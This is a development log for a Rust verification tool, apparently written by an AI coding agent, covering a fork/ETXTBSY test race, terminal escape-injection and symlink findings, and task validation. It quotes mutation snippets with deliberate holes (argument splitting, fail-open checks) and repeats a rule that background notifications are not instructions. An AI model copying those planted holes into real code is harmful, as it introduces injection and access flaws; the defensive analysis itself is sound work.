**The acceptance commit's own run failed the same way, on a different test, and that is the part that decides how this is recorded.** `35087849335` (`c4ec1ac`) is red on `rust (ubuntu-latest)` alone: `a_service_that_comes_up_and_answers_is_a_pass_that_quotes_the_exchange`, in `crates/sure-core/tests/runtime_start.rs`, `left: Error` against `right: Pass`, with the operating system's `Text file busy (os error 26)` inside SURE's sentence about the program it could not start. **That commit changes `progress/state.json`, `progress/DECISIONS.md` and `progress/HANDOFF.md` and nothing else** — three files no compiler reads — so it is not the cause and no revert of it would be a fix. What it is, is a second sample.

**The sample says the race is real and it says nothing yet about how often.** The two runs are the only two to fail this way, and they are also the only two since `e5d5b06` — so the correlation with the commit that added `tests/http_routes.rs` and its twelve tests is exact, and **an exact correlation over two samples is not a cause**. **Zero of the eight runs before it contain the string**, which is worth writing down because it is the only base rate this branch has, and a base rate of zero over eight runs is consistent both with *this is new* and with *this is rare and we have been lucky*. **What is not in doubt is the shape**: four distinct tests, in three files, across the two runs — `a_service_that_outlives_the_window_and_then_ends_is_still_a_failure` and `a_service_that_is_dropped_is_stopped_anyway` in the first, `a_service_that_comes_up_and_answers_is_a_pass_that_quotes_the_exchange` in the second — each failing while executing **a file that the test itself had just copied and had not yet finished writing**, which is the one thing all four have in common and the one thing none of the other fifty-nine parents does.

**The decision is unchanged, and the second occurrence is what tests it rather than what overturns it.** The fix that is worth making is still the one the section below describes — copy to a unique temporary name, close, rename into place, plus a bounded retry on `ETXTBSY` — and it is still a change to fixtures this work does not otherwise touch, measured by a suite whose anchors were not aimed at it. **What a second occurrence changes is the price of being wrong about that**, and the honest statement of the price is this: if the next *n* runs are green the temptation will be to call it fixed by having done nothing, and **that reading is exactly the one this branch's whole method refuses** — a flake that has stopped appearing has not thereby been explained. So the falsifier stands as written and gets one clause sharper: **the task that next touches either fixture, or that adds a fixture of its own that copies the test binary and executes it, makes the change and re-runs the workspace under load, recording *n* runs clean rather than the word *fixed*.** **`P5-T004` is the next task and it is watched by that clause**, which is why the clause is written here rather than left in the section above.

### A Linux-only race the first push found in another task's fixtures, and why it is recorded rather than repaired here

The run of `e5d5b06` was **red on its first attempt and green on its second**, and
the red is worth more than the green: it is a real defect, in this repository's own
test fixtures, that no gate on this machine can see. **The first attempt** had
`rust (windows-latest)` and `rust (macos-latest)` green and Ubuntu failing two
tests — `a_service_that_outlives_the_window_and_then_ends_is_still_a_failure` in
`crates/sure-core/tests/runtime_start.rs` and
`a_service_that_is_dropped_is_stopped_anyway` in
`crates/sure-core/tests/service_supervisor.rs` — and both failed the same way:
the status was `Error` where the test wanted `Fail`, because **SURE could not start
the program at all**. The reason SURE wrote names the operating system's own
words: **`Text file busy (os error 26)`**. The two panics are kept verbatim at
`target/tmp/p5t003-run1-ubuntu-failure.txt`, and the interesting half is the path
in them: `.../outlives-then-ends-7168-8/bin/python` and
`/tmp/sure-service-dropped-7272/working/python`.

**Both of those files are a copy of the test binary, and both are made by
`fs::copy` immediately before they are run.** `Fixture::python` in
`runtime_start.rs:342` and the helper at `service_supervisor.rs:170` do the same
thing and say why in their own comments: the program has to be *named* `python` so
that `sure_core::safety`'s classification reads it as one, and it has to *be* this
binary so that the child is the test binary run again in child mode.
`std::fs::copy` opens the destination `O_WRONLY|O_CREAT|O_TRUNC` and holds that
descriptor for the whole copy — and what is being copied is not small: **5.6 MB on
Windows and a debug binary on Linux is larger still**. So the window in which
`bin/python` exists, is complete, and is open for writing by its own test is
**milliseconds wide**, which is an eternity next to everything else in these tests.

**The mechanism is a `fork`, and the window it needs is the one `O_CLOEXEC` does
not close.** Every one of these tests spawns processes, and the tests in a binary
run in parallel threads. A spawn calls `fork`, and **`fork` duplicates the whole
descriptor table into the child** — including the write descriptor another thread's
`fs::copy` is holding — and the child keeps it until its own `execve`. If any
thread `execve`s that file inside *that* window, Linux answers `ETXTBSY`, because
the rule is about the **inode** being open for writing by *any* process and not
about who opened it. `O_CLOEXEC`, which Rust sets on everything it opens, closes
the descriptor at the child's `execve` — which is precisely the moment after the
window that matters, so it does not help. That two different tests in two different
binaries failed in one run, at paths no other test uses, is what that mechanism
predicts and what "a shared resource" would not.

**This is a claim with its reasoning shown rather than a reproduction, and it
should be read that way.** It cannot be reproduced on this machine: **Windows has
no `ETXTBSY`**, so the platform that would fail is the platform that cannot be run
here, and the evidence is the errno, the `fs::copy` idiom, the size of what is
copied, and the fact that a re-run of the same job on the same commit came back
green. Nothing in this session saw the race happen twice, and the falsifier below
is what would settle it.

**Three things follow, and the third is why this is a section rather than a fix in
this task's commit.** First, **the product behaved correctly**: SURE reported that
it could not start the program, in the operating system's own words, and reported
`Error` rather than a pass — which is `NOT STARTED IS NOT A PASS` doing its job one
layer down, on a condition nobody designed a test for. Second, **this commit cannot
be its cause**: `e5d5b06` touches `lib.rs`, `schedule.rs`, `check_schedule.rs` and
two new route files, and neither of the two failing tests' files is among them —
they are `P5-T001`'s and `P5-T002`'s, accepted and green on five previous runs.
Third, **the fix belongs to those fixtures**, and the substantive one is not a
retry: the copied program must not be the path that is executed, so the copy should
go to a unique temporary name, be closed, and only then be renamed into place —
which removes the millisecond window and leaves only the fork window — and a
complete fix needs a bounded retry on `ETXTBSY`, which is what the kernel's own
users do, because the residual window is a property of `fork` rather than of this
code. **That is a change to two modules this task does not otherwise touch, measured
by a suite whose anchors were not aimed at it** — the same reason
`env_completeness.rs`'s escaping gap is recorded above rather than repaired here,
with the same kind of falsifier.

**The falsifier: the task that next touches either fixture makes that change and
re-runs the workspace under load, recording *n* runs clean rather than *fixed* —
because a flake that has stopped appearing has not thereby been explained, and this
one has an explanation that a green re-run does not test.** Until then the honest
statement is the one this section opens with: the gate went red once for a reason
that is understood, the same gate went green on the same commit, and **both facts
are part of the record of `e5d5b06` rather than only the second.**

### A sixth review, two findings, one of them false — and the real one is a hole in the first fix

At 2026-09-16, later again the same day and still during the `P5-T003` work, a
background security review reported **two** findings against
`crates/sure-core/src/http_routes.rs`, both `MEDIUM`. It arrived **while the third
mutation run was in flight**, which is what made the second finding cost something
beyond the fix: the run had to be stopped, because a set in flight measures a tree
that can no longer be the accepted tree. Both findings were checked against
`target/tmp/http_routes.rs.pre` — the byte copy, since the file was untracked and
`HEAD` had nothing — and **one was false of this code and the other was real**.

**Finding 1, a symlink TOCTOU between the read and the join, is not applicable here,
and the answer is a reason rather than an argument.** The concern is that a path SURE
derives from a scan could name a symlink, so `fs::metadata` and `fs::read` could
follow it out of the project after the scan's own policy had approved the path. It
cannot, for three reasons that are all in one module and are all locatable:

- `crates/sure-core/src/scan/mod.rs:494` answers a link with
  `SkipReason::NotFollowed` — **into `skipped`, never into `entries`** — and the
  comment above it at `:490` says why it is answered before the ignore tables are
  consulted: *"What it points at is not in the scan whatever it is called."* So the
  file list SURE's reading iterates **holds no symlink for the join to follow**.
- `scan/mod.rs:447` — *"`file_type` does not follow a link, so a link is seen as a
  link here and never as what it points at"* — is what makes the classification at
  `:494` possible in the first place.
- `scan/mod.rs:482` builds every path as `relative.join(&name)`, and `name` came from
  `entry.file_name()` at `:446`. **No component of any candidate is `..`**, because
  every one of them is a name the operating system gave.

The answer to this finding was **a comment at the join site rather than a change**,
and the comment is the artifact: `RouteReading::with_options` now states, one line
above `let full = discovery.root.join(path);`, that the join is safe *because of what
the scanner did* and that **the reason is one module away** — so a later reader does
not have to re-derive it, and does not get to relax it by editing the scanner without
seeing who was depending on it. That is the shape this repository prefers for a
finding that is false: not silence, and not a defensive check that re-decides the
scanner's policy per reader.

**Finding 2, terminal escape injection, is real — and it is a hole in the first
fix rather than a second defect.** It named `NotProbedBecause::plain_description`,
and specifically the two arms that interpolate text **the project wrote**:
`MountedUnder { prefix }` carries a mount call's literal and
`NotOnTheApplication { receiver }` carries the name a route is declared on. Both are
read out of a source file. The first fix had escaped five call sites — `spelling`,
`Route::anchor`'s location, `Route::plain_description`, `NotProbed::plain_description`
and `RouteCheck::of`'s `CheckReason::RouteDeclared.declared_in` — and this sentence
was not one of them, **because the module had written down that it was SURE's own
text.** It was not, for those two arms.

**That sentence in the doc comment is the most interesting thing in this finding, and
it is why the write-up is this long.** The escape was applied one call site at a
time, and the enumeration missed exactly the sentence the module's own prose claimed
did not need it. **A false claim in a comment is not only a documentation defect: it
is the reason the code was wrong.** The correction is therefore not a sixth call
site — a sixth entry in the same enumeration would have left the property in the same
place, dependent on someone remembering to add a seventh:

```rust
pub fn plain_description(&self) -> String {
    in_a_sentence(&match self {
```

**The escape now wraps the whole `match`**, so one call covers every arm that exists
and every arm added later, which is the property an enumeration cannot have.
`RouteCheck::of` already had that shape for the same reason, and that is recorded
next to it. The false claim was corrected rather than deleted: the doc now says the
sentence *is* SURE's own text **and is not all of it**, naming the two arms and
saying why that is the reason the escape belongs at the boundary.

**The test does not read a workspace, and it cannot.** It builds the two arms with a
real escape byte inside them and asserts both that no control character survives and
that the project's spelling is **escaped rather than dropped**, since deleting the
byte would satisfy the first assertion while telling a reader less than the file
says. Reading a workspace is not available for this half: **Windows forbids bytes
0–31 in a file name**, so a route whose *declared_in* carries the byte and a mount
prefix carrying it are reachable on Unix and macOS and unreachable through the
filesystem on the primary platform. `An integration test is not a place to assert a
property the platform will not produce` — the same conclusion the fifth survivor of
run 1 reached from the other direction.

**The catch was verified by hand before the set was re-run, because a test written to
close a finding is a claim until it is seen to fail.** Two mutations were applied in
turn and both were seen to fail the single test — first the boundary deleted
outright, then, because the harness's anchors must be contiguous and exactly-once,
the boundary replaced by `String::from`, which on a `String` is
`impl<T> From<T> for T` and therefore the identity. The second is the one the mutation
row uses, and it matters that it was checked: **it compiles**, so the row lands in
`CAUGHT` rather than in the `BUILD` list. The failure in both cases was at
`crates/sure-core/src/http_routes.rs:1747`, on the real byte.

**Two consequences follow from this finding, and both are recorded where they
belong rather than here.** The source changed after the third mutation run had
started, so **the third run was stopped and the accepted log is the fourth** — a set
is evidence about one tree. And the module's escaping is now tested from two
directions: the invariant over the sentences a reader gets, and the two arms that
carry a project's own text. Detail in *What `P5-T003` added*, above.

### A review that named `http_routes.rs`, and the defect the reading then found

At 2026-09-16, during the `P5-T003` work, a background security review named
`crates/sure-core/src/http_routes.rs` and carried **no finding text** — the same
shape as the `config/mod.rs` notification recorded below. **This one had a real
defect behind it**, which is the reason the two are written up differently: the
file was read directly instead of the notification being acknowledged, and the
reading found a genuine instance of the class this repository treats as the most
serious one.

**The defect: a project's own text reaching a sentence SURE prints without being
escaped.** A route's path and the file it was read from are both project text, and
both go *inside* a sentence rather than being handed to a renderer as a field,
because they are what a reader needs in order to find the thing SURE is talking
about. `quoted` returns the characters between a literal's quotes **unchanged**,
so a project whose source holds a real control byte inside a route's string reaches
SURE's own output carrying it, and **a failing route could erase the report of its
own failure while a person was reading it** — a false green in the terminal rather
than in the verdict, and the hardest kind to notice afterwards, because the JSON
would have been right and only the line a human looked at would have lied.

**The treatment already existed three modules over and this one had not used it.**
`setup.rs`'s `in_a_sentence`, `runtime_start.rs` and `diagnostics::Field` are all
built on `redact::escape_control_characters`; this module was simply the first
place where the text entering the sentence is not text SURE composed. The fix is
one private `in_a_sentence` at **five** call sites — `spelling`, `Route::anchor`'s
location, `Route::plain_description`, `NotProbed::plain_description`, and
`RouteCheck::of`'s `CheckReason::RouteDeclared.declared_in` — the last escaped at
the boundary rather than inside `schedule.rs`, because one escape there covers both
the sentence and the anchor that reason builds. **`Route::path` is deliberately not
escaped**: it is what SURE asks for, and a request line built from an escaped path
would ask for something the project does not serve.

**The test asserts the invariant rather than the trigger.** No control character
survives in the six sentences a reader gets, and the assertion also holds that this
is an **escape and not a redaction** — deleting the byte would satisfy the
invariant while leaving a reader unable to see what the project actually wrote,
which is the same false green one step further in.

**The five call sites above are not the end of this story, and the subsection at the
top of this file is where it continues**: a sixth review found the one sentence the
enumeration missed, and the fix was to stop enumerating. A reader who takes *five*
from this paragraph as the count of places a project's text can reach SURE's output
in this module should read the newer one first.

**One adjacent gap was found by that reading and deliberately not fixed.**
`env_completeness.rs` builds a sentence and an anchor location from `display_path`
without escaping either, so the same defect class is present one module over. It is
pre-existing and outside this task's scope; the falsifier is the ordinary one — a
task that touches that module fixes it there, with its own evidence.

### A fifth review, the first one whose quoted text is a mutation anchor verbatim, and the one command that does not exist yet

At 2026-09-16, later the same day and still during the `P5-T003` work, a background
security review reported a `MEDIUM` against the same file — *"Broken security
control / evidence-integrity bypass — response evidence not bound to the run
fingerprint"* — quoting this, verbatim:

```rust
pub fn run(&self) -> Vec<CheckResult> {
    let fingerprint = sure_domain::ids::FingerprintId::generate();
```

and suggesting the fix:

```rust
let fingerprint = self.enforcement.check_plan().fingerprint.clone();
```

**The suggested fix is the shipped line, character for character, and the quoted
line is mutation row 24 of the harness that was running at the time.** The row is
`the fingerprint is invented rather than read from the plan`, its anchor is exactly
`let fingerprint = self.enforcement.check_plan().fingerprint.clone();`, and its
replacement is exactly `let fingerprint = sure_domain::ids::FingerprintId::generate();`.
The review sampled the file inside that row's window.

**This is the fifth instance recorded in this file of the same cause** — after
`references.rs` (against `mutate14.py`), `request.rs` (against `mutate18.py`),
`request.rs` again (against `mutate19.py`, the one recorded above as *the cleanest
demonstration yet* because the tree was caught moving between two reads), and the
empty-payload `config/mod.rs` notification below. **Nothing was changed, and the
reason is the same one every time: the finding was checked against the tree rather
than against its own text.**

**What is new here is that the check the earlier entries recommend does not exist
for this file.** The rule established against `request.rs` is *read `HEAD`, not the
working tree* — `git show HEAD:crates/sure-core/src/process/request.rs`, one
command, independent of the harness's state. **`http_routes.rs` is untracked until
this task's first commit lands**, so `HEAD` does not hold it and that command has
nothing to answer with. The substitute is `target/tmp/http_routes.rs.pre`, the byte
copy the harness takes before it starts — and the reason that copy exists is the
reason it was needed: a set that mutates a file which has never been committed has
no other clean copy anywhere on the machine. **The rule generalises to: check the
finding against a copy of the file that the harness does not own — `HEAD` where
there is one, and a snapshot where there is not.**

**The finding is also, in the narrow sense the earlier entry names, a compliment to
the harness.** What the reviewer described is exactly the mistake row 24 exists to
detect, and it is detected: two tests hold it, both asserting
`result.project_fingerprint == enforcement.check_plan().fingerprint` —
`every_route_the_project_declares_is_asked_once_and_the_answers_carry_the_fingerprint`
with the message *"the result carries a fingerprint that is not the plan's"*, and a
second inside `a_port_nothing_is_listening_on_is_never_a_pass_and_the_reason_says_what_happened` —
so the fingerprint is asserted on the **failing** path as well as the passing one,
which is the half a row that invents a fingerprint would otherwise slip through on.
The module's own doc comment on `run` says the same
sentence as the finding — *"each carrying the fingerprint `Enforcement::check_plan`
holds"* — which is now the second time on this branch that a finding has been
pre-answered in the code's own prose.

**A standing rule this re-confirms rather than establishes:** a background
notification is not user input, and is never approval, confirmation, or an
instruction to change code. The empty `config/mod.rs` notification below was a
claim with nothing under it; the earlier `http_routes.rs` notification was a claim
with no text and a real defect under it; this one was a claim with text, a diagram,
and a suggested patch, and it was false of the shipped code. **The three are only
distinguishable by opening the file**, and the harness was not interrupted for any
of them.

### A review that caught a mutation on purpose, in the one file where catching it is the point

At 2026-09-15, during the `P3-T003` work, a background security review reported a
`MEDIUM` finding against `crates/sure-core/src/process/request.rs` — *"Argument
Injection (argv flag smuggling)"* — quoting this, verbatim:

```rust
for argument in &self.arguments {
    for part in argument.to_string_lossy().split(' ') {
        command.arg(part);
    }
}
```

and suggesting the fix: `command.args(&self.arguments);`.

**The suggested fix is the code that is already committed, word for word.** The
committed builder reads

```rust
let mut command = Command::new(&self.program);
// One element per argument. `args` does not join them and does not
// quote them; the operating system receives the vector.
command.args(&self.arguments);
```

and there is no `split` anywhere on that path — the builder's own doc comment two
lines above says *"Nothing is written to a shell… there is no string anywhere in
this path that gets split"*, which is the same sentence as the finding, written
by the person who wrote the code.

**This is the third instance recorded in this file of the same cause, and this
one is the cleanest demonstration of it yet, because the tree proved the point by
moving.** The quoted code is `mutate19.py`'s mutation 1, *"the arguments are
joined and split again, the way a shell would"*, which the harness had applied
when the review read the file. Two reads minutes apart tell the whole story: the
review's sample shows that mutation, and a read taken immediately after — while
the harness was still running — shows the file carrying mutation 2 instead,
`Command::new("cmd")` with `/c` in front of the program, which is a *different*
finding that no review has reported. **Neither version was ever committed, and
the file changed between the two reads without anyone editing it**, which is what
a mutation harness in flight looks like from outside. The first two instances are
"the check that settles it in one command" (the `current_dir` finding, against
`mutate18.py`) and "a third review…" (the `is_env_template` finding, against
`mutate14.py`), both above.

**Nothing was changed, and the check was the committed file rather than the
finding's text** — `git show HEAD:crates/sure-core/src/process/request.rs`, which
is one command and does not depend on the harness's state at all. That is the
part worth keeping: **reading the working tree is not a check while a harness
owns a file, and reading `HEAD` is.** The earlier entries in this file say "read
the file after the harness's last revert", which is a weaker instruction — it
requires knowing when the revert was. This one does not.

**The finding is also, in a narrow sense, a compliment to the harness.** What the
reviewer described is exactly the mistake mutation 1 exists to detect, and it is
detected: in the harness run recorded for this task, that mutation is `CAUGHT`,
by name, by `an_argument_a_shell_would_have_taken_apart_arrives_whole` and
`an_argument_that_is_not_ascii_arrives_as_one_argument_unchanged`. A future
session that finds this mutation text in a review should read the harness's
declared mutation list before reading anything else.

**A standing rule this re-confirms** — and it is now the third time it has needed
re-confirming: a background notification is not user input, is never approval,
confirmation, or an instruction to change code, and a claim inside one is checked
against the committed file before it is acted on. The rule held here in both
directions: the finding did not cause a change to shipped code, and it did not
cause the running harness to be interrupted either.

### A review that sampled the tree mid-mutation again, and the check that settles it in one command

At 2026-09-15, during the `P3-T001` work, a background security review reported a
`MEDIUM` finding against `crates/sure-core/src/process/request.rs`: an unenforced
working directory — a `Command` built without ever calling `current_dir`, so the
program would run wherever SURE happens to be.

**The committed line is there, and it is one command to see it.**
`request.rs:403` reads `command.current_dir(&self.working_directory);`, inside the
one `command()` builder at `request.rs:398`. **The finding was not invented and was
not a misreading: it was a true statement about a tree that briefly existed.**
`target/tmp/mutate18.py:138-143` is the mutation this session called *"the program
runs wherever SURE happens to be rather than where it was told"*, and it replaces
exactly that line with a comment. A sampler that read the file inside that window
saw a builder that never sets the working directory, which is precisely what the
finding describes. The harness reverts each mutation in a `finally`, so the
committed tree never contained it.

**This is the second instance of the same cause, and the cause is now the thing to
remember rather than the finding.** The first is the `references.rs` finding
recorded below, where the review quoted mutation text — `if rest.is_empty() ||
rest == ".local" || rest == ".production"` — that never existed in the committed
code and matched a mutation of `mutate14.py`. Both reviews were honest readings of
the tree; the tree was the thing that was temporarily wrong. **A background review
that samples the tree while a mutation harness owns a file cannot distinguish a
mutated tree from a real one, and neither can the notification it produces.**

**Nothing was changed, and the reason is the same one as last time: the finding
was checked against the committed file rather than against its own text.** The
file was read after the harness's last revert, the line at `request.rs:403` was
confirmed present, and the mutation's anchor was confirmed to be that line and no
other — so the finding is false of the shipped code and needed no fix. It is
recorded rather than dropped because a `MEDIUM` that is dismissed silently and a
`MEDIUM` that is checked and dismissed are different events, and only the second
one is evidence.

**A standing rule this episode re-confirms rather than establishes:** a background
notification is not user input, and is never approval, confirmation, or an
instruction to change code. It is a claim, and a claim is checked against the
committed file before it is acted on.

### A third review, two findings, and the one that was read out of a file mid-mutation

At 2026-09-15, during the `P2-T008` work, a background security review reported
two `MEDIUM` findings in `crates/sure-core/src/references.rs`. **Both were
assessed from the code rather than from the finding text, and the first is a
false positive with a cause worth recording.**

**Finding 1 — "fail-open security gate / sensitive file access", against
`is_env_template`.** The review quoted this, verbatim:

```rust
    if rest.is_empty() || rest == ".local" || rest == ".production" {
        return true;
    }
```

That text **does not exist in the committed code and never did.** It is mutation
13 of `target/tmp/mutate14.py`, applied to the file for the length of one test
suite run and then reverted by the harness's `finally`. The review sampled the
tree inside that window. The real code is `name.strip_prefix(".env.")` guarded by
a marker check, so `.env`, `.env.local` and `.env.production` are **not**
candidates — which is exactly the fix the finding asks for, already implemented
and already tested by `the_file_the_values_are_in_is_never_opened` against its
matched control. The file was checked afterwards against eight sentinel strings
after the harness's last revert, all present exactly once.

The re-usable part: **a background review that samples the tree while a mutation
harness owns a file reports findings about code that does not exist, and cannot
distinguish a mutated tree from a real one.** The remedy is not to stop running
either tool; it is to check the finding against the committed file before acting
on it, which is what the sentinel grep does.

**Finding 2 — symlink bypass of the sensitive-file exclusion, against
`Reader::read`.** This one names real code: `discovery.root.join(&candidate.path)`
followed by `fs::metadata` and `fs::read`, all of which follow links. It is
**not reachable**, and the chain is closed at three points in `scan`:

1. `scan/mod.rs:447` — `entry.file_type()` does not follow a link, with the
   comment saying so.
2. `scan/mod.rs:490-498` — a link is answered **before** the ignore tables are
   consulted and pushed to `skipped` as `SkipReason::NotFollowed`. Every symlink,
   file or directory, goes there; none reaches `entries`. The comment states the
   intent: *"What it points at is not in the scan whatever it is called."*
3. `scan/mod.rs:229-231` — `Scan { entries: Vec<Entry> }` is private and `Scan`
   has no public constructor, so no caller can forge entries. `..` cannot appear
   either, since the names come from directory listings.

That is also the repository's reader idiom rather than a shortcut taken here:
`discover/read.rs:571` does the same `File::open(root.join(entry))` with no
symlink check, and the fingerprint readers use `symlink_metadata` **because they
walk entries directly** rather than taking a `Scan`.

**The fix was declined, and the reason is the repository's own evidence rule.**
A `symlink_metadata` guard in `references.rs` would be **unreachable code that no
test can exercise** — it cannot be made to fire through any `Scan` a caller can
construct — and an unexercisable guard creates the appearance of a boundary
without being one, while implying that the sibling readers which lack it are
unsafe. What remains is the same TOCTOU window already recorded as
`ECOSYSTEM_DISCOVERY.md` gap 6: a file swapped for a link between the scan and the
read is read through. **`references.rs`'s reader is a second instance of gap 6,
not a new gap.** It is recorded here so the window is fixed once, for all readers,
by whoever owns gap 6 — rather than patched in one module where the patch would
look like a fix and test like nothing at all.

### A second review notification, this one acknowledged by inspecting the file

At 2026-09-14T13:47Z, during the `P2-T004` work, a push security review notified

> Push security review found: Path Traversal / Symlink TOCTOU in crates/sure-core/src/discover/read.rs

**The finding text was empty again** — the body was the same harness telemetry
payload as the notification below (`[claude-code:unrecognized_model]`, a session
-title query), not a statement about the code. So there was again nothing to act
on. **But this one named a file written in this session and a risk class that
could plausibly be real**, so it was not merely filed: `read.rs` was read, and
the question "can a project make SURE read a file outside itself?" was answered
from the code rather than from the notification.

**What the inspection found, in the order that matters.** Containment is by
construction and not by a check: a path a manifest names goes through
`contained_relative`, which returns only `Component::Normal`; each component is
then resolved against the **walk's own records** (`Tree::is_directory`,
`Tree::child_directories`) and never by joining onto the filesystem; and
`read_json` takes the `Probe` the walk produced rather than a path, so what is
read and what was found cannot come from two different walks. A directory link
inside the project therefore cannot redirect a workspace pattern, because the
walk never followed it and the tree does not record it as a directory.

**One window is real and was not recorded anywhere.** `read_text` calls
`File::open(root.join(entry))`, and an open follows whatever is at that path
*now* — so a project that swaps `manifest` for a link pointing outside, between
the walk and the read, is read through. It is now `ECOSYSTEM_DISCOVERY.md`'s gap
6, with what bounds it (that read is the one place the filesystem is consulted
twice), what it is not (an **integrity** problem, not a disclosure — the content
lands in a report read by the person who can already open the target, and it
changes nothing that is executed), and why it is left open (`O_NOFOLLOW` and
`FILE_FLAG_OPEN_REPARSE_POINT` are the fixes; the Windows flag needs `unsafe`,
which this workspace forbids). `FINGERPRINTING.md` gap 5 is the same window for
the fingerprint's reader.

**So the honest summary is: a content-free notification, an inspection that
found no traversal, and one real race recorded as a gap rather than fixed.** The
gap is the owner's to weigh, not this session's to close — and it is written down
so that the next person does not have to rediscover it from an empty payload.

### One unactioned notification, recorded rather than dropped

At 2026-09-14T11:05Z a background task notification arrived reading

> Push security review found: issue in crates/sure-core/src/config/mod.rs

and the reminder body that followed it, under "address or acknowledge the
findings below", contained no finding — the text there was
`[claude-code:unrecognized_model] {"model":"deepseek-flash","query_source":"generate_session_title"}`,
which is a harness telemetry payload about generating a session title and not a
statement about the code. **There was nothing to act on and nothing to dismiss:**
the file was named and the reason was not.

It is recorded here rather than silently dropped because "reviewed, nothing
found" and "never actually reviewed" are the two states this project keeps apart
everywhere else, and a notification that arrives with an empty payload is the
second one wearing the first one's clothes. `crates/sure-core/src/config/mod.rs`
was read at the time and holds nothing that looks like a finding: it validates
endpoint URLs, refuses credentials embedded in a URL as userinfo, and
deliberately does not repeat a credential's value in an error message. That is a
reader's impression, not a review result, and it is written here as one.

**If a later session finds a real security review waiting, treat this paragraph
as the acknowledgement and act on the actual finding.** Nothing depends on the
absent text.

## What `P7-T004` added

- `crates/sure-core/src/coverage_summary.rs` (new, ~220 lines) —
  `CoverageNotCheckedSummary`, `NotCheckedEntry`, and `summarize(schedule, report,
  capability)`.
- Joins each scheduled check to its `CheckResult` by `CheckId`; counts checks that
  `produced_a_result()` as checked, and categorises the rest as skipped or
  could-not-run.
- `CheckStatus::Skipped` becomes a skipped entry with a plain-language reason from
  `NotCheckedReason::plain_explanation()`; `Error`, `Unknown`, and any other
  non-result status become could-not-run with an honest fallback sentence.
- Not-checked entries are ordered by critical-first, then severity descending,
  then title ascending, so the most important gaps appear first.
- `support_level` carries the adapter's tier description
  (`CapabilityReport::tier::plain_description()`), making the report say how much
  the run could actually see.
- `CoverageNotCheckedSummary` exposes `is_complete()`,
  `critical_not_checked_count()`, and a one-sentence `plain_summary()`.
- `crate::aggregation::RunReport` gained a `results()` accessor so the summary can
  join against the aggregation without recomputing it.
- `crates/sure-core/tests/coverage_summary.rs` (new) covers complete runs, skipped
  and could-not-run counts, critical gaps, support-level propagation, ordering,
  and control-character escaping.

## Validation of `P7-T004`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P7-T005` added

- `crates/sure-core/src/project_verdict.rs` (new, ~145 lines) —
  `build_verdict()` assembles a `ProjectVerdict` from its inputs;
  `render_summary()` produces a plain-language overall summary.
- `crates/sure-core/src/lib.rs` — one line: `pub mod project_verdict;`.
- `crates/sure-core/tests/project_verdict.rs` (new, ~268 lines) — integration
  tests for the acceptance scenarios.
- The summary includes the aggregate headline, hand-off readiness, the
  after-the-fact user-request caveat, the adapter support level, open-finding
  counts by severity, and a sentence for skipped/could-not-run checks.
- Independent false-green protection: the summary says the project is not ready
  if the aggregate is not green or any open finding blocks hand-off, even if
  `ProjectVerdict::is_ready_for_hand_off` were inconsistent.
- Critical not-checked check titles are escaped with
  `crate::redact::escape_control_characters` before being listed.

## Validation of `P7-T005`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |

## What `P7-T006` added

- `crates/sure-cli/src/human_report.rs` (new, ~495 lines) — `HumanReportSettings`,
  `render_verdict()`, and `write_verdict()`.
- Renders a `ProjectVerdict` to plain terminal text: aggregate headline, overall
  summary from `project_verdict::render_summary`, findings rendered via
  `plain_language_finding::render_findings`, coverage/not-checked section via
  `coverage_summary::summarize`, and the user-request caveat.
- Material findings are shown first; non-material findings are grouped under an
  explicit "some details are missing" label.
- No ANSI colour codes by default; `color` is opt-in.
- Attacker-controlled titles and descriptions are escaped with
  `escape_control_characters`; `crates/sure-core/src/redact.rs` made the function
  public so the CLI can reuse it.
- 12 inline tests cover green project report, must-fix says not ready,
  skipped/errored checks visible, caveat presence/absence, control-character
  escaping, plain-text default, material/non-material ordering, and model-only
  flagging.

## Validation of `P7-T006`

| Gate | Result |
| --- | ------ |
| `cargo fmt --all -- --check` | green |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | green |
| `cargo test --workspace --no-fail-fast` | green |
| `node scripts/validate-bootstrap.mjs` | green (17 phases, 166 tasks) |
| `node scripts/taskctl.mjs validate` | green (state OK) |
